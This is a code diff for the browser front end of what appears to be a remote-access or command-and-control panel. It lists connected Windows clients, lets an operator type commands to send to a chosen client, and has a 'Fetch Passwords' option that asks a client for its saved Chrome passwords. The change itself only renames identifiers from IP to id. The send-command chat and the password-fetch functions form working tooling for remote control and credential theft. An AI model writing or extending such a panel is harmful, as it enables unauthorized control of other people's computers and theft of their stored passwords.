@@ -12,8 +12,8 @@ async function displayClients() {
   const clients = await response.json();
   const clientsContainer = document.getElementById('clients-container');
 
-  for (let ip in clients) {
-    console.log(ip);
+  for (let id of clients) {
+    console.log(`rec id: ${id}`);
     const clientDiv = document.createElement('div');
     clientDiv.className = 'client';
 
@@ -21,38 +21,38 @@ async function displayClients() {
     const optionBar = document.createElement('i');
     optionBar.className = "fa-solid fa-ellipsis-vertical"
     clientDiv.appendChild(optionBar)
-    optionBar.addEventListener("click",() => DisplaySettings(clientDiv,ip))
+    optionBar.addEventListener("click",() => DisplaySettings(clientDiv,id))
 
     const clientIcon = document.createElement('i');
     clientIcon.className = 'fa-brands fa-windows';
     clientIcon.style.color = '#49da3e';
-    clientIcon.addEventListener('click', () => onClientClick(ip, clientIcon));
+    clientIcon.addEventListener('click', () => onClientClick(id, clientIcon));
     clientDiv.appendChild(clientIcon);
 
     const clientIp = document.createElement('div');
     clientIp.className = 'client-ip';
-    clientIp.textContent = ip;
+    clientIp.textContent = id.split(':')[0];
     clientDiv.appendChild(clientIp);
 
     clientsContainer.appendChild(clientDiv);
   }
 
  
-  function onClientClick(ip, clientIcon) {
+  function onClientClick(id, clientIcon) {
     const icons = clientsContainer.querySelectorAll('.client img');
     icons.forEach(icon => {
       icon.classList.remove('selected');
     });
 
-    if (selectedClient !== ip) {
+    if (selectedClient !== id) {
       clientIcon.classList.add('selected');
-      handleChat(ip);
+      handleChat(id);
       chatVisible = true;
     } else {
       toggleChatVisibility();
     }
 
-    selectedClient = chatVisible ? ip : null;
+    selectedClient = chatVisible ? id : null;
   }
 }
 
@@ -63,7 +63,7 @@ function toggleChatVisibility() {
   containerChat.style.display = chatVisible ? 'block' : 'none';
 }
 
-function handleChat(hostname) {
+function handleChat(id) {
   const buttonSend = document.getElementById('sentButton')
   const containerChat = document.getElementById('ChatContainer');
   containerChat.style.display = 'block'
@@ -73,7 +73,7 @@ function handleChat(hostname) {
   chatHeader.innerHTML = "";
   const ipElement = document.createElement('div');
   ipElement.className = 'title';
-  ipElement.textContent = `Client IP: ${hostname}`;
+  ipElement.textContent = `Client Id: ${id}`;
   chatHeader.appendChild(ipElement);
 
 
@@ -128,7 +128,7 @@ function handleChat(hostname) {
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({message:{command: userInput}, ip: hostname})
+        body: JSON.stringify({message:{command: userInput}, id: id})
       });
 
       const data = await response.json();
@@ -159,7 +159,7 @@ function handleChat(hostname) {
   };
 }
 
-function PasswordOption(e, hostname){
+function PasswordOption(e, id){
   e.preventDefault();
   toggleAll("");
   fetch('/passwordsTableIndex')
@@ -171,7 +171,7 @@ function PasswordOption(e, hostname){
       modal.id = "PasswordMainTable"
       document.body.appendChild(modal);
       
-      FetchPasswords(hostname).then(data => {
+      FetchPasswords(id).then(data => {
         console.log(data);
         let profileSelection = document.querySelector('#profile-selection');
         for(let profile in data){
@@ -210,7 +210,7 @@ function PasswordOption(e, hostname){
 }
 
 
-function DisplaySettings(clientDiv,hostname){
+function DisplaySettings(clientDiv,id){
   let menu = document.getElementById('settings-menu');
 
   if (!menu) {
@@ -227,7 +227,7 @@ function DisplaySettings(clientDiv,hostname){
     passwords.href = "#";
     passwords.textContent = "Fetch Passwords";
     passwords.style = "padding: 5px 5px 5px 5px;";
-    passwords.addEventListener('click', (e) => PasswordOption(e, hostname));
+    passwords.addEventListener('click', (e) => PasswordOption(e, id));
     li.appendChild(passwords);
 
     ul.appendChild(li);
@@ -243,13 +243,13 @@ function DisplaySettings(clientDiv,hostname){
 }
 
 
-function FetchPasswords(hostname){
+function FetchPasswords(id){
   return fetch("/send_message", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:"chrome"}, ip: hostname})
+    body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:"chrome"}, id: id})
   })
   .then(response => {
     if (!response.ok) {
